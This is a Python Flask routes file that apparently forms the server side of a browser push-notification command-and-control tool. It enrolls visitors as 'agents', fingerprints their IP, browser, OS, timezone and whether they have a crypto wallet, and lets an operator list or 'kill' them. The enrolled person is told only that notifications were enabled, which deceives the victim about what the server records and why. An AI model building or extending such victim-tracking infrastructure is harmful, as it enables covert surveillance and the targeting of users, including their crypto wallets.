"""
Agent management routes
"""
from flask import Blueprint, request, jsonify
from datetime import datetime
import json
import hashlib
from models import db, Agent

agents_bp = Blueprint('agents', __name__)


@agents_bp.route('/enroll', methods=['POST'])
def enroll_agent():
    """Enroll a new agent"""
    try:
        data = request.json
        subscription = data.get('subscription')
        fingerprint = data.get('fingerprint', {})
        
        if not subscription:
            return jsonify({'error': 'No subscription provided'}), 400
        
        # Generate unique agent ID
        agent_id = hashlib.sha256(
            json.dumps(subscription, sort_keys=True).encode()
        ).hexdigest()[:16]
        
        # Check if agent exists
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        
        if agent:
            agent.last_seen = datetime.utcnow()
            agent.is_active = True
            agent.push_subscription = json.dumps(subscription)
        else:
            agent = Agent(
                agent_id=agent_id,
                push_subscription=json.dumps(subscription),
                user_agent=request.headers.get('User-Agent'),
                ip_address=request.remote_addr,
                browser=fingerprint.get('browser'),
                os=fingerprint.get('os'),
                screen_resolution=fingerprint.get('screen'),
                timezone=fingerprint.get('timezone'),
                language=fingerprint.get('language'),
                has_crypto_wallet=fingerprint.get('hasCryptoWallet', False)
            )
            db.session.add(agent)
        
        db.session.commit()
        
        print(f"[+] Agent enrolled: {agent_id} ({agent.browser} on {agent.os})")
        
        return jsonify({
            'success': True,
            'agent_id': agent_id,
            'message': 'Notifications enabled successfully'
        })
        
    except Exception as e:
        print(f"[-] Enrollment error: {str(e)}")
        return jsonify({'error': str(e)}), 500


@agents_bp.route('/agents', methods=['GET'])
def get_agents():
    """Get all agents"""
    agents = Agent.query.order_by(Agent.last_seen.desc()).all()
    return jsonify([agent.to_dict() for agent in agents])


@agents_bp.route('/agents/<int:agent_id>', methods=['GET'])
def get_agent(agent_id):
    """Get specific agent"""
    agent = Agent.query.get_or_404(agent_id)
    return jsonify(agent.to_dict())


@agents_bp.route('/agents/<int:agent_id>', methods=['DELETE'])
def delete_agent(agent_id):
    """Delete/kill an agent"""
    try:
        agent = Agent.query.get(agent_id)
        if not agent:
            return jsonify({'error': 'Agent not found'}), 404
        
        agent_info = f"{agent.agent_id} ({agent.browser} on {agent.os})"
        
        db.session.delete(agent)
        db.session.commit()
        
        print(f"[+] Agent deleted: {agent_info}")
        
        return jsonify({
            'success': True,
            'message': f'Agent {agent_info} deleted'
        })
        
    except Exception as e:
        print(f"[-] Delete agent error: {str(e)}")
        return jsonify({'error': str(e)}), 500
